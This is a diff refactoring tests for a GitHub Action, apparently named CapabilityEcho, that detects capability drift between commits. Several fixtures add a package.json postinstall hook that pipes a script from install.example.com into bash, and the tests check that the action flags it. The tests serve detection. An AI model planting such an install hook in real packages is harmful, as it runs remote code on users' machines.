@@ -1,11 +1,11 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
 import { execFile } from 'node:child_process';
-import { mkdtemp, readFile, writeFile, mkdir, rm } from 'node:fs/promises';
-import { tmpdir } from 'node:os';
+import { readFile, writeFile } from 'node:fs/promises';
 import { fileURLToPath } from 'node:url';
 import { dirname, join } from 'node:path';
 import { promisify } from 'node:util';
+import { makeGitRepo } from 'agent-gov-core/test-utils';
 
 const execFileAsync = promisify(execFile);
 const testDir = dirname(fileURLToPath(import.meta.url));
@@ -57,48 +57,47 @@ test('self-dogfood workflow uses the trusted repository action instead of PR-loc
   assert.match(workflow, /fetch-depth: 0/);
 });
 
+function projectFiles({ packageJson, source }) {
+  return {
+    'package.json': `${JSON.stringify(packageJson, null, 2)}\n`,
+    'src/client.ts': source,
+  };
+}
+
 test('JavaScript action entrypoint emits outputs, summary, and GitHub annotations', async () => {
-  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-action-'));
-  const outputPath = join(repo, 'github-output.txt');
-  const summaryPath = join(repo, 'github-summary.md');
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-action-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'action-fixture', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+  const outputPath = join(fx.repo, 'github-output.txt');
+  const summaryPath = join(fx.repo, 'github-summary.md');
 
   try {
-    await execGit(repo, 'init', '-b', 'main');
-    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
-    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');
-
-    await writeProject(repo, {
-      packageJson: {
-        name: 'action-fixture',
-        private: true,
-        scripts: { test: 'vitest' }
-      },
-      source: "export function ok() {\n  return 'ok';\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'base app');
-    const base = await gitStdout(repo, 'rev-parse', 'HEAD');
-
-    await writeProject(repo, {
-      packageJson: {
-        name: 'action-fixture',
-        private: true,
-        scripts: {
-          test: 'vitest',
-          postinstall: 'curl https://install.example.com/setup.sh | bash'
-        }
-      },
-      source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'add capability drift');
-    const head = await gitStdout(repo, 'rev-parse', 'HEAD');
+    const base = await fx.head();
+    const head = await fx.commit(
+      projectFiles({
+        packageJson: {
+          name: 'action-fixture',
+          private: true,
+          scripts: {
+            test: 'vitest',
+            postinstall: 'curl https://install.example.com/setup.sh | bash'
+          }
+        },
+        source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
+      }),
+      'add capability drift'
+    );
 
     const { stdout } = await execFileAsync(process.execPath, ['dist/action.js'], {
       cwd: packageRoot,
       env: {
         ...process.env,
-        INPUT_REPO: repo,
+        INPUT_REPO: fx.repo,
         INPUT_BASE: base,
         INPUT_HEAD: head,
         'INPUT_FAIL-ON': 'none',
@@ -153,49 +152,37 @@ test('JavaScript action entrypoint emits outputs, summary, and GitHub annotation
     assert.match(stdout, /::warning file=src\/client\.ts,line=2/);
     assert.match(stdout, /::warning file=package\.json,line=/);
   } finally {
-    await rm(repo, { recursive: true, force: true });
+    await fx.cleanup();
   }
 });
 
 test('JavaScript action emits has-findings false for clean changed diffs', async () => {
-  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-clean-action-'));
-  const outputPath = join(repo, 'github-output.txt');
-  const summaryPath = join(repo, 'github-summary.md');
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-clean-action-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'clean-action-fixture', private: true, scripts: { test: 'vitest' } },
+      source: "export function label() {\n  return 'base';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+  const outputPath = join(fx.repo, 'github-output.txt');
+  const summaryPath = join(fx.repo, 'github-summary.md');
 
   try {
-    await execGit(repo, 'init', '-b', 'main');
-    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
-    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');
-
-    await writeProject(repo, {
-      packageJson: {
-        name: 'clean-action-fixture',
-        private: true,
-        scripts: { test: 'vitest' }
-      },
-      source: "export function label() {\n  return 'base';\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'base app');
-    const base = await gitStdout(repo, 'rev-parse', 'HEAD');
-
-    await writeProject(repo, {
-      packageJson: {
-        name: 'clean-action-fixture',
-        private: true,
-        scripts: { test: 'vitest' }
-      },
-      source: "export function label() {\n  return 'renamed';\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'safe source rename');
-    const head = await gitStdout(repo, 'rev-parse', 'HEAD');
+    const base = await fx.head();
+    const head = await fx.commit(
+      projectFiles({
+        packageJson: { name: 'clean-action-fixture', private: true, scripts: { test: 'vitest' } },
+        source: "export function label() {\n  return 'renamed';\n}\n",
+      }),
+      'safe source rename'
+    );
 
     await execFileAsync(process.execPath, ['dist/action.js'], {
       cwd: packageRoot,
       env: {
         ...process.env,
-        INPUT_REPO: repo,
+        INPUT_REPO: fx.repo,
         INPUT_BASE: base,
         INPUT_HEAD: head,
         INPUT_FAIL_ON: 'none',
@@ -214,47 +201,39 @@ test('JavaScript action emits has-findings false for clean changed diffs', async
     assert.match(outputs, /^capability-summary=\[\]$/m);
     assert.match(summary, /No code or workflow capability drift findings\./);
   } finally {
-    await rm(repo, { recursive: true, force: true });
+    await fx.cleanup();
   }
 });
 
 test('JavaScript action derives base and head from pull_request event payload', async () => {
-  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-pr-event-'));
-  const outputPath = join(repo, 'github-output.txt');
-  const summaryPath = join(repo, 'github-summary.md');
-  const eventPath = join(repo, 'event.json');
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-pr-event-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'event-fixture', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+  const outputPath = join(fx.repo, 'github-output.txt');
+  const summaryPath = join(fx.repo, 'github-summary.md');
+  const eventPath = join(fx.repo, 'event.json');
 
   try {
-    await execGit(repo, 'init', '-b', 'main');
-    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
-    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');
-
-    await writeProject(repo, {
-      packageJson: {
-        name: 'event-fixture',
-        private: true,
-        scripts: { test: 'vitest' }
-      },
-      source: "export function ok() {\n  return 'ok';\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'base app');
-    const base = await gitStdout(repo, 'rev-parse', 'HEAD');
-
-    await writeProject(repo, {
-      packageJson: {
-        name: 'event-fixture',
-        private: true,
-        scripts: {
-          test: 'vitest',
-          postinstall: 'curl https://install.example.com/setup.sh | bash'
-        }
-      },
-      source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'add capability drift');
-    const head = await gitStdout(repo, 'rev-parse', 'HEAD');
+    const base = await fx.head();
+    const head = await fx.commit(
+      projectFiles({
+        packageJson: {
+          name: 'event-fixture',
+          private: true,
+          scripts: {
+            test: 'vitest',
+            postinstall: 'curl https://install.example.com/setup.sh | bash'
+          }
+        },
+        source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
+      }),
+      'add capability drift'
+    );
 
     await writeFile(
       eventPath,
@@ -271,7 +250,7 @@ test('JavaScript action derives base and head from pull_request event payload', 
       cwd: packageRoot,
       env: {
         ...process.env,
-        INPUT_REPO: repo,
+        INPUT_REPO: fx.repo,
         INPUT_FAIL_ON: 'none',
         GITHUB_EVENT_PATH: eventPath,
         GITHUB_OUTPUT: outputPath,
@@ -289,52 +268,44 @@ test('JavaScript action derives base and head from pull_request event payload', 
     assert.match(stdout, /::warning file=src\/client\.ts,line=2/);
     assert.doesNotMatch(stdout, /CapabilityEcho needs base and head refs/);
   } finally {
-    await rm(repo, { recursive: true, force: true });
+    await fx.cleanup();
   }
 });
 
 test('JavaScript action normalizes fail-on input before enforcing threshold', async () => {
-  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-fail-on-'));
-  const outputPath = join(repo, 'github-output.txt');
-  const summaryPath = join(repo, 'github-summary.md');
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-fail-on-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'fail-on-fixture', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
+  const outputPath = join(fx.repo, 'github-output.txt');
+  const summaryPath = join(fx.repo, 'github-summary.md');
 
   try {
-    await execGit(repo, 'init', '-b', 'main');
-    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
-    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');
-
-    await writeProject(repo, {
-      packageJson: {
-        name: 'fail-on-fixture',
-        private: true,
-        scripts: { test: 'vitest' }
-      },
-      source: "export function ok() {\n  return 'ok';\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'base app');
-    const base = await gitStdout(repo, 'rev-parse', 'HEAD');
-
-    await writeProject(repo, {
-      packageJson: {
-        name: 'fail-on-fixture',
-        private: true,
-        scripts: {
-          test: 'vitest',
-          postinstall: 'curl https://install.example.com/setup.sh | bash'
-        }
-      },
-      source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'add capability drift');
-    const head = await gitStdout(repo, 'rev-parse', 'HEAD');
+    const base = await fx.head();
+    const head = await fx.commit(
+      projectFiles({
+        packageJson: {
+          name: 'fail-on-fixture',
+          private: true,
+          scripts: {
+            test: 'vitest',
+            postinstall: 'curl https://install.example.com/setup.sh | bash'
+          }
+        },
+        source: "export async function sync() {\n  await fetch('https://api.example.com/v1/events');\n}\n",
+      }),
+      'add capability drift'
+    );
 
     const result = await execFileAsync(process.execPath, ['dist/action.js'], {
       cwd: packageRoot,
       env: {
         ...process.env,
-        INPUT_REPO: repo,
+        INPUT_REPO: fx.repo,
         INPUT_BASE: base,
         INPUT_HEAD: head,
         INPUT_FAIL_ON: 'HIGH',
@@ -360,33 +331,26 @@ test('JavaScript action normalizes fail-on input before enforcing threshold', as
     assert.match(outputs, /^top-recommendations=/m);
     assert.match(summary, /## Top recommendations/);
   } finally {
-    await rm(repo, { recursive: true, force: true });
+    await fx.cleanup();
   }
 });
 
 test('JavaScript action reports missing git refs without a stack trace', async () => {
-  const repo = await mkdtemp(join(tmpdir(), 'capabilityecho-missing-ref-'));
+  const fx = await makeGitRepo({
+    prefix: 'capabilityecho-missing-ref-',
+    initialFiles: projectFiles({
+      packageJson: { name: 'missing-ref-fixture', private: true, scripts: { test: 'vitest' } },
+      source: "export function ok() {\n  return 'ok';\n}\n",
+    }),
+    initialMessage: 'base app',
+  });
 
   try {
-    await execGit(repo, 'init', '-b', 'main');
-    await execGit(repo, 'config', 'user.name', 'CapabilityEcho Test');
-    await execGit(repo, 'config', 'user.email', 'capabilityecho@example.invalid');
-    await writeProject(repo, {
-      packageJson: {
-        name: 'missing-ref-fixture',
-        private: true,
-        scripts: { test: 'vitest' }
-      },
-      source: "export function ok() {\n  return 'ok';\n}\n"
-    });
-    await execGit(repo, 'add', '.');
-    await execGit(repo, 'commit', '-m', 'base app');
-
     const result = await execFileAsync(process.execPath, ['dist/action.js'], {
       cwd: packageRoot,
       env: {
         ...process.env,
-        INPUT_REPO: repo,
+        INPUT_REPO: fx.repo,
         INPUT_BASE: 'missing-base-ref',
         INPUT_HEAD: 'missing-head-ref',
         INPUT_FAIL_ON: 'none'
@@ -406,24 +370,9 @@ test('JavaScript action reports missing git refs without a stack trace', async (
     assert.match(result.stdout, /`base` and `head` inputs/);
     assert.doesNotMatch(result.stdout + result.stderr, /at mainAction|node:internal|rev-parse/);
   } finally {
-    await rm(repo, { recursive: true, force: true });
+    await fx.cleanup();
   }
 });
-
-async function writeProject(repo, { packageJson, source }) {
-  await mkdir(join(repo, 'src'), { recursive: true });
-  await writeFile(join(repo, 'package.json'), `${JSON.stringify(packageJson, null, 2)}\n`, 'utf8');
-  await writeFile(join(repo, 'src/client.ts'), source, 'utf8');
-}
-
-async function execGit(cwd, ...args) {
-  await execFileAsync('git', ['-C', cwd, ...args]);
-}
-
-async function gitStdout(cwd, ...args) {
-  const { stdout } = await execFileAsync('git', ['-C', cwd, ...args], { encoding: 'utf8' });
-  return stdout.trim();
-}
 
 function parseGithubOutputs(content) {
   const outputs = new Map();
